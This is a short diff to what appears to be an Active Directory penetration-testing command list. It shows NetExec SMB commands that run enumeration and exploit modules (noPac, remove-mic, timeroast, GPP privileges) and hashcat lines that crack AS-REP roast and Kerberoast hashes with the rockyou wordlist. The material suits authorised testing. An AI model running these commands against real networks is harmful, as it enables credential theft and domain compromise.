@@ -26,9 +26,9 @@ nxc smb <ip> --use-kcache -M enum_av -M enum_ca -M enum_cve -M gpp_privileges -M
 
 nxc smb <ip> -u '<user>' -p '<password>' -M nopac -M remove-mic
 
-[ -s hashes.asreproast ] && timeout 20 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet
+sh -c '[ -s hashes.asreproast ] && hashcat --runtime 30 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet'
 
-[ -s hashes.kerberoast ] && timeout 20 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet
+sh -c '[ -s hashes.kerberoast ] && hashcat --runtime 30 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet'
 
 nxc smb <ip> -u '<user>' -p '<password>' -M timeroast
 
